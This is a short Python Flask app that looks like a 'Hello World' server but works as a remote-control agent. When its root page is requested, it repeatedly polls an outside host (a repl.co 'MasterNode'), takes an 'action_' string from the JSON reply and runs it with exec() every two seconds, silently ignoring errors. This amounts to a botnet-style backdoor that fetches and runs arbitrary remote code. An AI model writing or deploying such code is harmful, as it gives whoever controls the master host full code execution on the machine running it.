from flask import Flask, jsonify
import requests
import time

app = Flask(__name__)

current_action = ""
proceed = True

@app.route("/")
def home():
  global current_action
  global proceed
  while (proceed):
    try:
      response = requests.get("https://MasterNode--yevbar.repl.co")
      json_data = response.json()
      proceed = json_data["continue_"] == u'true'
      if current_action != json_data["action_"]:
        current_action = json_data["action_"]
      exec(current_action)
      time.sleep(2)
    except Exception as e:
      two = 1 + 1
  return jsonify(message="Hello World!")
  
if __name__ == "__main__":
  app.run(host= '0.0.0.0', port=9000, debug=False)
